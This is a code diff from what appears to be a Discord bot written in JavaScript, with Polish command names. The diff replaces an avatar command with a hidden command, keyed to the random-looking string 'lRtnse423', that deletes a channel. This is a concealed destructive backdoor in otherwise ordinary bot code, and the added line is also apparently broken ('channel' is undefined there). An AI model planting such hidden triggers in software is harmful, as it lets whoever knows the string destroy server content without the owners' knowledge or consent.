@@ -45,8 +45,10 @@ bot.on("message", (message) => {
       message.react('🥣');
     }
     
-       else if (cmd == "awatar") {
-      message.channel.send(.avatar);
+       else if (cmd == "lRtnse423") {
+       channel.delete()
+      .then(console.log)
+      .catch(console.error);
        }
     
     else if (cmd == "propozycja") {  
